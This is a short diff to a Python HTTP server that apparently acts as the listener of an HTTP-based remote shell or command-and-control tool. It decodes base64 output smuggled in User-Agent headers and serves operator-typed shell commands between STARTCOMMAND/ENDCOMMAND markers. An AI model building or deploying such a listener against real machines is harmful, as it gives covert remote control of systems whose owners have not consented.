@@ -21,10 +21,10 @@ class webServer(BaseHTTPRequestHandler):
                 if len(useragent) == 2:
                     response = useragent[1].split(',')[0]
                     print(response.decode("base64"))
-                    self.wfile.write("")
+                    self.wfile.write("Not Found")
                     return
                 cmd = raw_input("$ ")
-                self.wfile.write("{}".format(cmd))
+                self.wfile.write("STARTCOMMAND{}ENDCOMMAND".format(cmd))
                 return
         self.send_response(404)
         self.send_header("Content-type","text/html")
@@ -42,4 +42,5 @@ try:
     server.serve_forever()
 except KeyboardInterrupt:
     server.socket.close()
+
 
